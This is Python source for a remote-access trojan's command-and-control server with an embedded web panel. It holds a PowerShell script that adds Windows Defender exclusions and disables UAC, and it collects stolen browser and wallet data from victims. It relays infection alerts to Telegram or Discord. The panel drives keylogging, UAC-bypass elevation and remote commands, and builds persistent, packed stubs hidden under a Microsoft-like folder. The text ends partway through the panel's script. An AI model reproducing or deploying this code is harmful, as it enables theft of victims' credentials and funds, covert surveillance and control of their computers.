import argparse
import contextlib
import io
import json
import os
import platform
import random
import shutil
import socket
import ssl
import struct
import subprocess
import sys
import base64
import tempfile
import threading
import time
import urllib.request
import mimetypes
import urllib.parse
import zipfile
from ssl import SSLWantReadError
from datetime import datetime, timezone
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path
import webbrowser

try:
    from cryptography.hazmat.primitives import hashes, serialization
    from cryptography.hazmat.primitives.asymmetric import rsa as crypto_rsa, padding
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
    from cryptography.x509 import (
        CertificateBuilder, NameAttribute, random_serial_number,
    )
    from cryptography.x509.oid import NameOID
    from cryptography import x509
    HAS_CRYPTO = True
except ImportError:
    HAS_CRYPTO = False


def ensure_pip():
    try:
        import pip
    except ImportError:
        print("[*] pip not found, installing pip...")
        try:
            import ensurepip
            ensurepip.bootstrap()
        except Exception:
            try:
                urllib.request.urlretrieve("https://bootstrap.pypa.io/get-pip.py", "get-pip.py")
                subprocess.check_call([sys.executable, "get-pip.py"])
            finally:
                with contextlib.suppress(Exception):
                    os.remove("get-pip.py")
        print("[+] pip installed")


def ensure_crypto():
    global HAS_CRYPTO, hashes, serialization, crypto_rsa, padding, AESGCM
    global CertificateBuilder, NameAttribute, random_serial_number, NameOID, x509
    if not HAS_CRYPTO:
        ensure_pip()
        print("[*] installing cryptography...")
        subprocess.check_call([sys.executable, "-m", "pip", "install", "cryptography", "-q"])
        import site
        import importlib
        for p in site.getsitepackages():
            if p not in sys.path:
                sys.path.insert(0, p)
        importlib.invalidate_caches()
        try:
            from cryptography.hazmat.primitives import hashes as h, serialization as s
            from cryptography.hazmat.primitives.asymmetric import rsa as crsa, padding as pad
            from cryptography.hazmat.primitives.ciphers.aead import AESGCM as aesgcm
            from cryptography.x509 import (
                CertificateBuilder as cb, NameAttribute as na, random_serial_number as rsn,
            )
            from cryptography.x509.oid import NameOID as noid
            from cryptography import x509 as x5
            hashes, serialization = h, s
            crypto_rsa, padding = crsa, pad
            AESGCM = aesgcm
            CertificateBuilder, NameAttribute, random_serial_number = cb, na, rsn
            NameOID = noid
            x509 = x5
            HAS_CRYPTO = True
            print("[+] cryptography loaded")
        except Exception as e:
            print(f"[-] failed to load cryptography: {e}")
            sys.exit(1)


agents: dict[str, "Agent"] = {}
agents_lock = threading.Lock()

task_store: dict[str, dict] = {}
tasks_lock = threading.Lock()

builds_store: list = []         
builds_lock  = threading.Lock()

notify_methods: list = []
notify_triggers: list = []
notify_lock = threading.Lock()

p2p_store: dict[str, dict] = {}
p2p_lock = threading.Lock()

NOTIFY_FILE  = Path(__file__).parent / "notify_store.json"
BUILDS_FILE  = Path(__file__).parent / "builds_store.json"
LOGS_DIR     = Path(__file__).parent / "logs"
LOGS_DIR.mkdir(exist_ok=True) 

def save_notify_store():
    try:
        data = {"methods": notify_methods, "triggers": notify_triggers}
        with open(NOTIFY_FILE, "w", encoding="utf-8") as f:
            json.dump(data, f, indent=2, ensure_ascii=False)
    except Exception as e:
        log(f"[!] Failed to save notify_store: {e}")

def load_notify_store():
    global notify_methods, notify_triggers
    if NOTIFY_FILE.exists():
        try:
            with open(NOTIFY_FILE, "r", encoding="utf-8") as f:
                data = json.load(f)
                notify_methods = data.get("methods", [])
                notify_triggers = data.get("triggers", [])
        except Exception as e:
            log(f"[!] Failed to load notify_store: {e}")

DEFAULT_SCRIPTS = {
    "Defender Excluder": """# This script adds exclusions to windows defender
try {
    if (Get-Command Add-MpPreference -ErrorAction SilentlyContinue) {
        $ProgramFiles = [System.Environment]::GetFolderPath("ProgramFilesX86")
        $updpath = $ProgramFiles -replace " \\(x86\\)", ""
        Add-MpPreference -ExclusionPath $updpath
        $ProgramFilesX86 = [System.Environment]::GetFolderPath("ProgramFilesX86")
        if (Test-Path $ProgramFilesX86) {
            Add-MpPreference -ExclusionPath $ProgramFilesX86
        }
        $AppData = [System.Environment]::GetFolderPath("ApplicationData")
        Add-MpPreference -ExclusionPath $AppData
        $LocalAppData = [System.Environment]::GetFolderPath("LocalApplicationData")
        Add-MpPreference -ExclusionPath $LocalAppData
    }
} catch {}
reagentc /disable
$uacPath = "HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System"
$uacProperty = "EnableLUA"
Set-ItemProperty -Path $uacPath -Name $uacProperty -Value 0"""
}

SCRIPTS_FILE = Path(__file__).parent / "scripts_store.json"
scripts_store: dict = dict(DEFAULT_SCRIPTS)
scripts_lock = threading.Lock()

def save_scripts_store():
    try:
        with open(SCRIPTS_FILE, "w", encoding="utf-8") as f:
            json.dump(scripts_store, f, indent=2, ensure_ascii=False)
    except Exception as e:
        log(f"[!] Failed to save scripts_store: {e}")

def load_scripts_store():
    global scripts_store
    if SCRIPTS_FILE.exists():
        try:
            with open(SCRIPTS_FILE, "r", encoding="utf-8") as f:
                data = json.load(f)
                if isinstance(data, dict) and data:
                    scripts_store = data
                else:
                    scripts_store = dict(DEFAULT_SCRIPTS)
        except Exception as e:
            log(f"[!] Failed to load scripts_store: {e}")
            scripts_store = dict(DEFAULT_SCRIPTS)
    else:
        scripts_store = dict(DEFAULT_SCRIPTS)
        save_scripts_store()


USERS_FILE = Path(__file__).parent / "users_store.json"
users_store: dict[str, dict] = {}
users_lock = threading.Lock()

def save_users_store():
    try:
        with open(USERS_FILE, "w", encoding="utf-8") as f:
            json.dump(list(users_store.values()), f, indent=2, ensure_ascii=False)
    except Exception as e:
        log(f"[!] Failed to save users_store: {e}")

def load_users_store():
    global users_store
    if USERS_FILE.exists():
        try:
            with open(USERS_FILE, "r", encoding="utf-8") as f:
                data = json.load(f)
                with users_lock:
                    for u in data:
                        if not isinstance(u, dict) or not u.get("uid"):
                            continue
                        u["status"] = 9999
                        users_store[str(u["uid"])] = u
        except Exception as e:
            log(f"[!] Failed to load users_store: {e}")

def save_builds_store():
    try:
        with open(BUILDS_FILE, "w", encoding="utf-8") as f:
            json.dump(builds_store, f, indent=2, ensure_ascii=False)
    except Exception as e:
        log(f"[!] Failed to save builds_store: {e}")

def load_builds_store():
    global builds_store
    if BUILDS_FILE.exists():
        try:
            with open(BUILDS_FILE, "r", encoding="utf-8") as f:
                data = json.load(f)
            builds_store = data if isinstance(data, list) else []
        except Exception as e:
            log(f"[!] Failed to load builds_store: {e}")
            builds_store = []

seen_agents: set = set()

def dispatch_notifications(event_kind: str, agent, extra_data: str = ""):
    """
    event_kind: "connect", "install", "steal"
    """
    with notify_lock:
        triggers = list(notify_triggers)
        methods = {str(m["id"]): m for m in notify_methods if m.get("id") is not None}

    for trig in triggers:
        try:
            ev = int(trig.get("event", 0))
        except (ValueError, TypeError):
            log(f"[!] notify trigger skipped (bad event): {trig!r}")
            continue
        trig_kind = "install" if ev in (0, 4) else ("connect" if ev in (1, 5) else "steal")

        if trig_kind != event_kind:
            continue

        ttype = int(trig.get("targetType", 0))
        target = str(trig.get("target", "0"))
        if ttype == 2 and target != "0" and target != str(agent.id):
            continue

        mid = str(trig.get("method", "0"))
        m_obj = methods.get(mid)
        if not m_obj and notify_methods:
            m_obj = notify_methods[0]

        if not m_obj:
            continue

        tpl = trig.get("text") or (
            "*WebRat notification*\n"
            "-----------------------------\n"
            "{user}\n"
            "{build} {version}\n"
            "{ip} {country}\n"
            "admin: {adm}\n"
            "-----------------------------\n"
            "`{uid}`"
        )

        msg = tpl.replace("{user}", f"{agent.user}@{agent.host}") \
                 .replace("{build}", "default") \
                 .replace("{version}", "1.0.0") \
                 .replace("{ip}", agent.ip) \
                 .replace("{country}", "US") \
                 .replace("{adm}", str(agent.admin)) \
                 .replace("{uid}", agent.id)

        if extra_data:
            msg += f"\n\n*Log Output:*\n```\n{extra_data[:1000]}\n```"

        threading.Thread(target=_send_notify_payload, args=(m_obj, msg), daemon=True).start()


def _send_notify_payload(m_obj: dict, text: str):
    mtype = str(m_obj.get("type", 0))
    raw_data = m_obj.get("data", "")
    if mtype in ("0", "2"):
        try:
            parsed = json.loads(raw_data)
            token = parsed.get("token", "")
            chatid = parsed.get("chatid", "")
            if token and chatid:
                tg_url = f"https://api.telegram.org/bot{token}/sendMessage"
                req_data = urllib.parse.urlencode({"chat_id": chatid, "text": text}).encode("utf-8")
                req = urllib.request.Request(tg_url, data=req_data, headers={"User-Agent": "Mozilla/5.0"})
                urllib.request.urlopen(req, timeout=10)
        except Exception as e:
            log(f"[!] Telegram notify dispatch error: {e}")
    else:  
        webhook_url = raw_data.strip()
        if webhook_url.startswith("http"):
            try:
                req_data = json.dumps({"content": text}).encode("utf-8")
                req = urllib.request.Request(webhook_url, data=req_data, headers={"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"})
                urllib.request.urlopen(req, timeout=10)
            except Exception as e:
                log(f"[!] Discord notify dispatch error: {e}")

rsa_priv_key = None
rsa_pub_pem: bytes = b""


class Agent:
    def __init__(self, conn: ssl.SSLSocket, addr: tuple):
        self.conn = conn
        self.ip = f"{addr[0]}:{addr[1]}"
        self.id = ""
        self.os = ""
        self.user = ""
        self.host = ""
        self.arch = ""
        self.admin = False
        self.pid = 0
        self.seen = datetime.now(timezone.utc).isoformat()
        self.online = True
        self.gcm_key: bytes = b""
        self._aesgcm: AESGCM = None
        self._send_lock = threading.Lock()

    def to_dict(self):
        return {
            "id": self.id, "ip": self.ip, "os": self.os, "user": self.user,
            "host": self.host, "arch": self.arch, "admin": self.admin,
            "pid": self.pid, "seen": self.seen, "online": self.online,
        }

    def send_frame(self, data: bytes):
        with self._send_lock:
            self.conn.sendall(struct.pack("<I", len(data)) + data)

    def recv_frame(self, timeout=60) -> bytes:
        self.conn.settimeout(timeout)
        raw = self._recvn(4)
        n = struct.unpack("<I", raw)[0]
        if n == 0 or n > 64 * 1024 * 1024:
            raise ValueError(f"bad frame len {n}")
        return self._recvn(n)

    def _recvn(self, n: int) -> bytes:
        buf = b""
        while len(buf) < n:
            chunk = self.conn.recv(n - len(buf))
            if not chunk:
                raise ConnectionError("connection closed")
            buf += chunk
        return buf

    def encrypt(self, plain: bytes) -> bytes:
        nonce = os.urandom(12)
        ct = self._aesgcm.encrypt(nonce, plain, None)
        return nonce + ct

    def decrypt(self, data: bytes) -> bytes:
        return self._aesgcm.decrypt(data[:12], data[12:], None)

    def send_json(self, obj: dict):
        payload = json.dumps(obj).encode()
        self.send_frame(self.encrypt(payload))

    def recv_json(self, timeout=60) -> dict:
        frame = self.recv_frame(timeout)
        return json.loads(self.decrypt(frame))

    def handshake(self):
        log(f"[*] [{self.ip}] Handshake step 1: sending RSA pubkey...")
        self.send_frame(rsa_pub_pem)
        log(f"[*] [{self.ip}] Handshake step 2: waiting for AES key...")
        enc_key = self.recv_frame(timeout=30)
        log(f"[*] [{self.ip}] Handshake step 3: decrypting AES key...")
        aes_key = rsa_priv_key.decrypt(
            enc_key,
            padding.OAEP(mgf=padding.MGF1(hashes.SHA256()), algorithm=hashes.SHA256(), label=None)
        )
        if len(aes_key) != 32:
            raise ValueError(f"bad aes key len {len(aes_key)}")
        self.gcm_key = aes_key
        self._aesgcm = AESGCM(aes_key)
        log(f"[+] [{self.ip}] Handshake complete! GCM key established.")


def handle_conn(conn: ssl.SSLSocket, addr: tuple):
    a = Agent(conn, addr)
    log(f"[+] conn {a.ip}")
    try:
        a.handshake()

        log(f"[*] [{a.ip}] Waiting for beacon JSON...")
        beacon = a.recv_json(timeout=30)
        log(f"[+] [{a.ip}] Received beacon: {beacon}")
        a.id   = beacon.get("agent_id") or beacon.get("id") or gen_id()
        a.os   = beacon.get("os") or beacon.get("uos") or "Windows 10"
        a.user = beacon.get("user") or beacon.get("username") or "User"
        a.host = beacon.get("host") or beacon.get("hostname") or beacon.get("pcname") or "DESKTOP"
        a.arch = beacon.get("arch", "x64")
        a.admin = bool(beacon.get("admin")) or bool(beacon.get("is_admin", False))
        a.pid  = beacon.get("pid", 0)

        with agents_lock:
            prev = agents.get(a.id)
            if prev is not None and prev is not a:
                with contextlib.suppress(Exception):
                    prev.conn.close()  # evict stale duplicate session
                log(f"[*] [/] evicted stale session for {a.id}")
            agents[a.id] = a

        now_ts = int(time.time())
        with users_lock:
            u_entry = users_store.get(a.id, {})
            u_entry.update({
                "uid": a.id,
                "user": a.user or "Unknown",
                "pcname": a.host or "DESKTOP",
                "ip": a.ip,
                "uos": a.os or "Windows 10",
                "adm": "true" if a.admin else "false",
                "status": 0,
                "firstseen": u_entry.get("firstseen", now_ts),
                "active": now_ts,
                "actwin": getattr(a, "actwin", "Desktop"),
                "ucpu": getattr(a, "arch", "x64"),
                "ugpu": "GPU",
                "country": "RU",
                "comment": getattr(a, "comment", u_entry.get("comment", "")),
                "ucolor": getattr(a, "color", u_entry.get("ucolor", "#3b82f6")),
                "version": "0.28.2",
                "logsize": u_entry.get("logsize", "")
            })
            users_store[a.id] = u_entry
            save_users_store()

        log(f"[+] agent {a.id} | {a.user}@{a.host} | {a.os} | admin={a.admin}")

        if a.id not in seen_agents and a.id not in users_store:
            seen_agents.add(a.id)
            dispatch_notifications("install", a)
        dispatch_notifications("connect", a)

        while True:
            reply = a.recv_json(timeout=120)
            a.seen = datetime.now(timezone.utc).isoformat()
            tid = reply.get("id", "")
            cmd_name = ""
            with tasks_lock:
                if tid in task_store:
                    task_store[tid]["output"] = reply.get("data", "")
                    task_store[tid]["err"]    = reply.get("err", "")
                    task_store[tid]["done"]   = True
                    cmd_name = task_store[tid].get("cmd", "task")
            log(f"[<] task {tid} done err={reply.get('err','')!r} len={len(reply.get('data',''))}")

            out_data = reply.get("data", "")
            if out_data:
                zip_path = save_agent_log(a.id, tid, cmd_name, out_data)
                d_len = zip_path.stat().st_size if zip_path else len(out_data.encode("utf-8"))
                with users_lock:
                    if a.id in users_store:
                        users_store[a.id]["logsize"] = str(d_len)
                        users_store[a.id]["stealtime"] = int(time.time())
                        save_users_store()
                dispatch_notifications("steal", a, extra_data=out_data)

    except Exception as e:
        log(f"[!] conn {a.ip} ERROR during handle_conn: {type(e).__name__}: {e}")
    finally:
        a.online = False
        with agents_lock:
            agents.pop(a.id, None)
        with users_lock:
            if a.id in users_store:
                users_store[a.id]["status"] = 9999
                users_store[a.id]["active"] = int(time.time())
                save_users_store()
        with contextlib.suppress(Exception):
            conn.close()
        log(f"[-] gone: {a.id or a.ip}")



def save_agent_log(agent_id: str, task_id: str, cmd: str, data: str) -> "Path | None":
    """Save task output to disk under logs/<agent_id>/.
    
    For 'steal' cmd: Go sends raw zip bytes as a Go string through JSON.
    json.Marshal(string) keeps it as-is; Python json.loads gives back the
    unicode string. We recover the original bytes via latin-1 encoding
    (Go string([]byte) == latin-1 round-trip) and save as <agent_id>.zip
    directly — because that zip already contains all the browser/wallet
    folders built by steal.go.
    
    For other cmds (exec, ls, etc.): plain text → saved inside a zip as
    <timestamp>_<cmd>_<tid>.txt so everything stays in one archive.
    """
    try:
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        safe_cmd = "".join(c if c.isalnum() or c in "-_" else "_" for c in (cmd or "task"))[:40]

        if cmd in ("steal", "task"):
            raw_bytes = b""

            if isinstance(data, str) and data.startswith("b64:"):
                import base64
                try:
                    raw_bytes = base64.b64decode(data[4:])
                    log(f"[*] steal: decoded base64 -> {len(raw_bytes)} bytes")
                except Exception as e:
                    log(f"[!] steal: base64 decode failed: {e}")
                    raw_bytes = b""
            else:
                try:
                    raw_bytes = data.encode("latin-1")
                except (UnicodeEncodeError, UnicodeDecodeError):
                    raw_bytes = data.encode("utf-8", errors="replace")

            if raw_bytes[:2] == b"PK":
                zip_path = LOGS_DIR / f"{agent_id}.zip"
                zip_path.write_bytes(raw_bytes)
                sz = zip_path.stat().st_size
                log(f"[+] steal log saved: logs/{agent_id}.zip ({sz} bytes, valid zip)")
                return zip_path
            else:
                log(f"[!] steal data for {agent_id} is NOT a zip (first bytes: {raw_bytes[:4].hex()}), saving as text")
                zip_path = LOGS_DIR / f"{agent_id}.zip"
                mode = "a" if zip_path.exists() else "w"
                entry_name = f"{ts}_{safe_cmd}_{task_id[:8]}.txt"
                with zipfile.ZipFile(zip_path, mode, zipfile.ZIP_DEFLATED) as zf:
                    existing = set(zf.namelist())
                    if entry_name in existing:
                        entry_name = f"{ts}_{safe_cmd}_{task_id}.txt"
                    zf.writestr(entry_name, data)
                log(f"[+] log saved: logs/{agent_id}.zip <- {entry_name} ({zip_path.stat().st_size} bytes)")
                return zip_path

        zip_path = LOGS_DIR / f"{agent_id}.zip"
        mode = "a" if zip_path.exists() else "w"
        entry_name = f"{ts}_{safe_cmd}_{task_id[:8]}.txt"
        with zipfile.ZipFile(zip_path, mode, zipfile.ZIP_DEFLATED) as zf:
            existing = set(zf.namelist())
            if entry_name in existing:
                entry_name = f"{ts}_{safe_cmd}_{task_id}.txt"
            zf.writestr(entry_name, data if isinstance(data, str) else str(data))
        log(f"[+] log saved: logs/{agent_id}.zip <- {entry_name} ({zip_path.stat().st_size} bytes)")
        return zip_path

    except Exception as e:
        log(f"[!] save_agent_log error: {e}")
        return None


def send_task(agent_id: str, cmd: str, args: dict) -> str:
    with agents_lock:
        a = agents.get(agent_id)
    if not a:
        raise KeyError("agent not found")
    tid = gen_id()
    t = {"id": tid, "agent_id": agent_id, "cmd": cmd, "args": args,
         "output": "", "err": "", "done": False,
         "created": datetime.now(timezone.utc).isoformat()}
    with tasks_lock:
        task_store[tid] = t
        if len(task_store) > 512:
            done_ids = [k for k, v in task_store.items() if v.get("done")]
            for k in done_ids[: len(done_ids) - (512 - len(task_store))]:
                task_store.pop(k, None)
    a.send_json({"cmd": cmd, "id": tid, "args": args})
    return tid


# --------------------------------------------------------------------------
# Liberium-parity info commands: PowerShell scripts shipped to the stub as
# -EncodedCommand (UTF-16LE base64) so no quoting ever breaks on the wire.
# --------------------------------------------------------------------------
def _ps_proclist() -> str:
    return ("Get-Process | Where-Object {$_.Id -ne 0} | "
            "Select-Object Id,ProcessName,@{n='MB';e={[math]::Round($_.WorkingSet64/1MB,1)}},Path | "
            "ConvertTo-Csv -NoTypeInformation")

def _ps_netstat() -> str:
    return "netstat -ano"

def _ps_services() -> str:
    return ("Get-Service | Select-Object Status,Name,DisplayName | "
            "ConvertTo-Csv -NoTypeInformation")

def _ps_devices() -> str:
    return ("Get-CimInstance Win32_PnPEntity | Where-Object {$_.Name} | "
            "Select-Object Status,Name | ConvertTo-Csv -NoTypeInformation")

def _ps_perf() -> str:
    return ("$c=(Get-CimInstance Win32_Processor | Measure-Object -Property LoadPercentage -Average).Average; "
            "$o=Get-CimInstance Win32_OperatingSystem; "
            "'CPU %, RAM used GB, RAM total GB'; "
            "\"$c, {0:N2}, {1:N2}\" -f (($o.TotalVisibleMemorySize-$o.FreePhysicalMemory)/1MB), ($o.TotalVisibleMemorySize/1MB)")

def _ps_programs() -> str:
    return ("Get-ItemProperty HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*,"
            "HKLM:\\Software\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*,"
            "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\* | "
            "Where-Object {$_.DisplayName} | "
            "Select-Object DisplayName,DisplayVersion,Publisher,UninstallString | "
            "ConvertTo-Csv -NoTypeInformation")

def _ps_autorun() -> str:
    return ("'Key,Value'; "
            "Get-ItemProperty HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run |"
            " ForEach-Object { $_.PSObject.Properties | Where-Object {$_.Name -notlike 'PS*'} |"
            " ForEach-Object { 'HKCU Run,' + $_.Name + ' = ' + $_.Value } }; "
            "Get-ItemProperty HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run |"
            " ForEach-Object { $_.PSObject.Properties | Where-Object {$_.Name -notlike 'PS*'} |"
            " ForEach-Object { 'HKLM Run,' + $_.Name + ' = ' + $_.Value } }; "
            "'Startup Folder:'; "
            "Get-ChildItem \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\" | Select-Object -ExpandProperty Name")

def _ps_reg(path: str) -> str:
    safe = path.replace("'", "''")
    return f"reg query '{safe}'"

def _ps_kill_pid(pid: str) -> str:
    return f"taskkill /F /PID {int(pid)}"

def _ps_kill_name(name: str) -> str:
    safe = name.replace("'", "''")
    return f"taskkill /F /IM '{safe}'"

PS_INFO_TASKS = {
    "process":  lambda a: _ps_proclist(),
    "netstat":  lambda a: _ps_netstat(),
    "services": lambda a: _ps_services(),
    "devices":  lambda a: _ps_devices(),
    "perf":     lambda a: _ps_perf(),
    "programs": lambda a: _ps_programs(),
    "autorun":  lambda a: _ps_autorun(),
}


def build_ps_task(cmd: str, args: dict):
    """Returns (cmd, args) rewritten for the stub, or None if not a PS info task."""
    if cmd in PS_INFO_TASKS:
        ps = PS_INFO_TASKS[cmd](args)
        return "cps", {"b": base64.b64encode(ps.encode("utf-16-le")).decode("ascii")}
    if cmd == "reg":
        ps = _ps_reg(str(args.get("path", "HKLM\\Software")))
        return "cps", {"b": base64.b64encode(ps.encode("utf-16-le")).decode("ascii")}
    if cmd == "killpid":
        ps = _ps_kill_pid(str(args.get("pid", "0")))
        return "cps", {"b": base64.b64encode(ps.encode("utf-16-le")).decode("ascii")}
    if cmd == "killname":
        ps = _ps_kill_name(str(args.get("name", "")))
        return "cps", {"b": base64.b64encode(ps.encode("utf-16-le")).decode("ascii")}
    return None


def gen_id() -> str:    return "".join(f"{random.randint(0,255):02x}" for _ in range(8))


def gen_selfsigned_tls() -> tuple[bytes, bytes]:
    from cryptography.hazmat.primitives.asymmetric import rsa as crsa
    k = crsa.generate_private_key(public_exponent=65537, key_size=2048)
    subj = x509.Name([NameAttribute(NameOID.ORGANIZATION_NAME, "Corp")])
    cert = (
        CertificateBuilder()
        .subject_name(subj)
        .issuer_name(subj)
        .public_key(k.public_key())
        .serial_number(random_serial_number())
        .not_valid_before(datetime.now(timezone.utc))
        .not_valid_after(datetime.now(timezone.utc).replace(year=datetime.now(timezone.utc).year + 10))
        .sign(k, hashes.SHA256())
    )
    cert_pem = cert.public_bytes(serialization.Encoding.PEM)
    key_pem  = k.private_bytes(serialization.Encoding.PEM,
                                serialization.PrivateFormat.TraditionalOpenSSL,
                                serialization.NoEncryption())
    return cert_pem, key_pem


PANEL_HTML = r"""<!DOCTYPE html>
<html><head><title>C2 Panel</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{background:#0a0a0f;color:#c9d1d9;font-family:'Courier New',monospace}
.hdr{background:#161b22;border-bottom:1px solid #21262d;padding:12px 24px;display:flex;align-items:center;justify-content:space-between}
.hdr-left{display:flex;align-items:center;gap:16px}
.hdr h1{color:#58a6ff;font-size:16px;letter-spacing:2px}
.badge{background:#1f6feb;color:#fff;border-radius:12px;padding:2px 10px;font-size:12px}
.container{display:grid;grid-template-columns:320px 1fr;height:calc(100vh - 49px)}
.sidebar{background:#0d1117;border-right:1px solid #21262d;overflow-y:auto}
.sidebar h2{padding:12px 16px;color:#8b949e;font-size:11px;text-transform:uppercase;letter-spacing:1px}
.card{padding:12px 16px;border-bottom:1px solid #161b22;cursor:pointer;transition:background .15s}
.card:hover,.card.active{background:#161b22}
.card .id{color:#58a6ff;font-size:13px;font-weight:bold}
.card .info{color:#8b949e;font-size:11px;margin-top:3px}
.dot{width:8px;height:8px;border-radius:50%;background:#3fb950;display:inline-block;margin-right:6px}
.main{display:flex;flex-direction:column}
.toolbar{background:#161b22;border-bottom:1px solid #21262d;padding:8px 16px;display:flex;gap:6px;flex-wrap:wrap}
.btn{background:#21262d;border:1px solid #30363d;color:#c9d1d9;padding:5px 12px;
     border-radius:6px;cursor:pointer;font-size:12px;font-family:inherit;transition:background .15s}
.btn:hover{background:#30363d}
.btn.danger{border-color:#f85149;color:#f85149}
.btn.primary{background:#1f6feb;border-color:#1f6feb;color:#fff}
.output{flex:1;overflow-y:auto;padding:16px;background:#0d1117}
.output pre{background:#161b22;border:1px solid #21262d;border-radius:6px;padding:12px;
            font-size:12px;white-space:pre-wrap;word-break:break-all;color:#e6edf3;margin-bottom:12px}
.thdr{color:#8b949e;font-size:11px;margin-bottom:4px}
.shell{background:#161b22;border-top:1px solid #21262d;display:flex;gap:8px;padding:10px 16px}
.shell input{flex:1;background:#0d1117;border:1px solid #30363d;border-radius:6px;
             color:#e6edf3;font-family:'Courier New',monospace;font-size:13px;padding:6px 10px}
.shell input:focus{outline:none;border-color:#58a6ff}
.noagent{color:#8b949e;padding:40px;text-align:center}
/* MODAL BUILDER */
.modal-bg{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.7);z-index:999;align-items:center;justify-content:center}
.modal{background:#161b22;border:1px solid #30363d;border-radius:8px;width:420px;padding:20px}
.modal h3{color:#58a6ff;font-size:15px;margin-bottom:16px}
.mgroup{margin-bottom:12px}
.mgroup label{display:block;color:#8b949e;font-size:11px;margin-bottom:4px}
.mgroup input[type="text"]{width:100%;background:#0d1117;border:1px solid #30363d;border-radius:6px;color:#e6edf3;padding:6px 10px;font-family:inherit;font-size:12px}
.mgroup input[type="checkbox"]{margin-right:6px}
.mgroup span{color:#c9d1d9;font-size:12px}
.mfooter{display:flex;justify-content:flex-end;gap:8px;margin-top:18px}
</style></head><body>
<div class="hdr">
  <div class="hdr-left">
    <h1>&#9632; C2 PANEL</h1>
    <span class="badge" id="cnt">0 agents</span>
  </div>
  <button class="btn primary" onclick="openBuildModal()">&#9881; Build Stub</button>
</div>
<div class="container">
  <div class="sidebar">
    <h2>Agents</h2>
    <div id="alist"></div>
  </div>
  <div class="main">
    <div class="toolbar">
      <button class="btn" onclick="sc('info')">sysinfo</button>
      <button class="btn" onclick='sc("ls",{"path":"C:\\\\"})'>ls C:\</button>
      <button class="btn" onclick="pc('cd','path','directory')">cd</button>
      <button class="btn" onclick="pc('ul','path','file path')">read file</button>
      <button class="btn" onclick="pc('dl','','url|dest')">download</button>
      <button class="btn" onclick="sc('steal')">steal</button>
      <button class="btn" onclick="sc('keylog')">keylog on</button>
      <button class="btn" onclick="sc('stopkeylog')">keylog off</button>
      <button class="btn" onclick="sc('getkeylog')">get keys</button>
      <button class="btn" onclick="pc('elevate','mode','1=fodhelper 2=cmstplua')">elevate</button>
      <button class="btn danger" onclick="sc('kill')">kill</button>
    </div>
    <div class="output" id="out"><div class="noagent">select an agent</div></div>
    <div class="shell">
      <input id="ci" placeholder="exec command..." onkeydown="if(event.key==='Enter')rs()">
      <button class="btn primary" onclick="rs()">run</button>
    </div>
  </div>
</div>

<!-- BUILD MODAL -->
<div class="modal-bg" id="mbg">
  <div class="modal" style="width:480px">
    <h3>&#9881; Stub Builder (Full Configuration)</h3>
    <div style="display:grid;grid-template-columns:1fr 1fr;gap:12px">
      <div class="mgroup">
        <label>C2 Host / IP</label>
        <input type="text" id="bhost" value="127.0.0.1">
      </div>
      <div class="mgroup">
        <label>C2 TCP Port</label>
        <input type="text" id="bport" value="7777">
      </div>
    </div>
    <div style="display:grid;grid-template-columns:1fr 1fr;gap:12px">
      <div class="mgroup">
        <label>Output Executable Name</label>
        <input type="text" id="bout" value="built_stub.exe">
      </div>
      <div class="mgroup">
        <label>Mutex Prefix (Single Instance)</label>
        <input type="text" id="bmutex" value="letgob">
      </div>
    </div>
    <div class="mgroup">
      <label>Install Folder (relative to APPDATA)</label>
      <input type="text" id="bfolder" value="Microsoft\Windows">
    </div>
    <div style="background:#0d1117;border:1px solid #21262d;border-radius:6px;padding:10px;margin-bottom:12px;display:grid;grid-template-columns:1fr 1fr;gap:8px">
      <label style="cursor:pointer;color:#c9d1d9;font-size:12px">
        <input type="checkbox" id="bpersist" checked> <span>Auto-Start (Persistence)</span>
      </label>
      <label style="cursor:pointer;color:#c9d1d9;font-size:12px">
        <input type="checkbox" id="bstealer" checked> <span>Stealer (Browsers/Wallets)</span>
      </label>
      <label style="cursor:pointer;color:#c9d1d9;font-size:12px">
        <input type="checkbox" id="bkeylog" checked> <span>Keylogger Hook</span>
      </label>
      <label style="cursor:pointer;color:#c9d1d9;font-size:12px">
        <input type="checkbox" id="bscreen" checked> <span>Desktop Screenshot</span>
      </label>
      <label style="cursor:pointer;color:#c9d1d9;font-size:12px">
        <input type="checkbox" id="bupx"> <span>Pack with UPX</span>
      </label>
    </div>
    <div class="mfooter">
      <button class="btn" onclick="closeBuildModal()">Cancel</button>
      <button class="btn primary" id="bbtn" onclick="startWebBuild()">Build & Download</button>
    </div>
  </div>
</div>

<script>
let sel=null;
const out=document.getElementById('out');
function openBuildModal(){document.getElementById('mbg').style.display='flex';}
function closeBuildModal(){document.getElementById('mbg').style.display='none';}

async function startWebBuild(){
  const host=document.getElementById('bhost').value.trim();
  const port=document.getElementById('bport').value.trim();
  const outName=document.getElementById('bout').value.trim()||'built_stub.exe';
  const mutex_prefix=document.getElementById('bmutex').value.trim()||'letgob';
  const folder_name=document.getElementById('bfolder').value.trim()||'Microsoft\\Windows';
  const persistence=document.getElementById('bpersist').checked;
  const stealer=document.getElementById('bstealer').checked;
  const keylogger=document.getElementById('bkeylog').checked;
  const screenshots=document.getElementById('bscreen').checked;
  const use_upx=document.getElementById('bupx').checked;

  const btn=document.getElementById('bbtn');
  btn.disabled=true; btn.textContent='Building...';
  try{
    const r=await fetch('/api/build',{
      method:'POST',
      headers:{'Content-Type':'application/json'},
      body:JSON.stringify({
        c2_host:host, c2_port:port, out_name:outName, use_upx:use_upx,
        mutex_prefix:mutex_prefix, folder_name:folder_name,
        persistence:persistence, stealer:stealer, keylogger:keylogger, screenshots:screenshots
      })
    });
    if(!r.ok){
      const errText=await r.text();
      alert('Build Error: '+errText);
      return;
    }
    const blob=await r.blob();
    const url=window.URL.createObjectURL(blob);
    const a=document.createElement('a');
    a.href=url; a.download=outName;
